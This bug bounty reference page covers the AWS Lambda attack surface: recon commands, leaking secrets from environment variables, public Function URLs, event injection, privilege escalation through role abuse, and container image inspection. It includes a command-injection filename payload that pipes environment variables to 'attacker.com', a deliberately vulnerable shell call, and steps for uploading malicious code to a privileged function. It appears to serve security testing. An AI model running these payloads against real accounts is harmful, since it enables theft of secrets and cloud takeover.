> Source: https://bugbounty.info/Attack-Surface/Cloud/AWS/Lambda

# AWS Lambda

Lambda is interesting because the attack surface spans multiple directions: the function code itself, the event sources that trigger it, environment variables holding secrets, and the execution role attached to it. Function URLs (direct HTTP endpoints without API Gateway) introduced a new unauthenticated access vector that programs keep misconfiguring.

## Recon: Finding Lambda Functions

```bash
# List functions (requires lambda:ListFunctions)
aws lambda list-functions --region us-east-1
 
# Get function details including env vars (requires lambda:GetFunction)
aws lambda get-function --function-name FUNCTION_NAME
 
# Get just the config (env vars without code)
aws lambda get-function-configuration --function-name FUNCTION_NAME
 
# Check function URLs
aws lambda list-function-url-configs --function-name FUNCTION_NAME
```

If you have SSRF and hit the metadata service, the role creds you get might have `lambda:ListFunctions`. Always check.

## Environment Variable Leaks

Lambda functions commonly store secrets in env vars because it's convenient. If you can read function config via IAM or find the function source in a repo:

```bash
# This dumps env vars if you have the permission
aws lambda get-function-configuration --function-name FUNCTION_NAME \
  | jq '.Environment.Variables'
```

Common things I find in Lambda env vars: database connection strings, third-party API keys (Stripe, Twilio, SendGrid), internal service credentials, JWT signing secrets.

Also check the function code itself - download it and grep:

```bash
aws lambda get-function --function-name FUNCTION_NAME \
  | jq -r '.Code.Location'
# Returns a presigned S3 URL - wget it and unzip
wget -O function.zip "PRESIGNED_URL"
unzip function.zip -d function_src/
grep -r "password\|secret\|key\|token" function_src/
```

## Function URL Auth Bypass

Function URLs can be configured with `AuthType: NONE` (fully public) or `AuthType: AWS_IAM`. The vulnerability is when a function intended for internal use gets deployed with `NONE` by accident.

```bash
# Check auth type
aws lambda list-function-url-configs --function-name FUNCTION_NAME
# Look for "AuthType": "NONE"
 
# If NONE, just hit it directly
curl https://UNIQUE_ID.lambda-url.REGION.on.aws/
```

Even with `AWS_IAM` auth, check if there's a resource-based policy that grants public access:

```bash
aws lambda get-policy --function-name FUNCTION_NAME
# Look for Principal: * in the policy document
```

## Event Injection

Lambda functions process structured event data from various sources. If any of that data flows into a shell command, SQL query, or eval, you have injection. The tricky part is identifying what events a function processes and whether you control any of that input.

Common injectable event sources:

- **API Gateway** - HTTP request body, query params, headers flow directly into the event object
- **S3 triggers** - If you can write to the triggering bucket, you control the filename/object metadata
- **SQS/SNS** - If you can publish messages, you control the message body
- **DynamoDB streams** - If you can write records, you control the stream event

```python
# Example vulnerable Lambda (command injection via S3 object key)
import subprocess
def handler(event, context):
    key = event['Records'][0]['s3']['object']['key']
    subprocess.run(f"process_file {key}", shell=True)  # Don't do this
 
# Exploit: upload a file named:
# ; curl attacker.com/$(env | base64) #
```

## Execution Role Abuse

Every Lambda has an execution role. If the role is over-permissive, invoking the function gives you those permissions indirectly. More interesting: if you can update a Lambda's code or env vars (via `lambda:UpdateFunctionCode` or `lambda:UpdateFunctionConfiguration`), you can inject your own code and have it run with the function's role.

```bash
# Check if you can update function code
aws lambda update-function-code \
  --function-name FUNCTION_NAME \
  --zip-file fileb://malicious.zip
 
# Then invoke it
aws lambda invoke --function-name FUNCTION_NAME /tmp/output.json
```

This is a privesc path: `lambda:UpdateFunctionCode` + `lambda:InvokeFunction` on a function with an admin role = game over.

## Container Image Functions

Newer Lambda functions use container images instead of zip deployments. If the ECR repo is public or you have ECR pull permissions, you can pull the image and inspect it:

```bash
aws ecr get-login-password | docker login --username AWS --password-stdin ACCOUNT.dkr.ecr.REGION.amazonaws.com
docker pull ACCOUNT.dkr.ecr.REGION.amazonaws.com/REPO:TAG
docker history IMAGE_ID
docker run --rm IMAGE_ID env  # check env vars baked into image
```

## Public Reports

- Lambda function URL deployed with AuthType NONE exposes internal processing endpoint - [HackerOne #1638326](https://hackerone.com/reports/1638326)
- Lambda environment variables contain Stripe secret key readable via GetFunction API - [HackerOne #1517638](https://hackerone.com/reports/1517638)
- lambda:UpdateFunctionCode permission allows injecting code into privileged Lambda role - [HackerOne Hacktivity search](https://hackerone.com/hacktivity?querystring=lambda+privilege+escalation)
- S3 trigger on Lambda function vulnerable to command injection via object key - [HackerOne #1326820](https://hackerone.com/reports/1326820)

## Related

- [IAM Privilege Escalation](../../../Attack-Surface/Cloud/AWS/IAM-Privilege-Escalation) - Lambda is a key privesc vector via iam:PassRole
- [AWS Overview](../../../Attack-Surface/Cloud/AWS/)
